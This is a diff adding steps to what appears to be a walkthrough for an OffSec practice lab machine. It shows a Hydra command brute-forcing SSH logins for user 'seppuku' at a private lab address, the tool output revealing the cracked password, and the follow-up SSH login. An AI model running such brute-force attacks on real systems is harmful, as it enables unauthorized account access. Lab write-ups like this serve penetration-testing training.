@@ -429,3 +429,29 @@ monday
 monkey
 natasha
 ```
+
+SSH Password Brute-Force
+```
+> hydra -l seppuku -P passwords.txt 192.168.241.90 ssh
+```
+```
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-01 02:16:36
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:1/p:92), ~6 tries per task
+[DATA] attacking ssh://192.168.241.90:22/
+[22][ssh] host: 192.168.241.90   login: seppuku   password: eeyoree
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 2 final worker threads did not complete until end.
+[ERROR] 2 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-01 02:17:31
+```
+![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/2ad36b57-2228-4644-8f42-5960d435659f)
+
+SSH as Seppuku
+```
+> ssh seppuku@192.168.241.90
+```
+![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/c9649a00-f12b-438b-99d3-a5a437aefe9b)
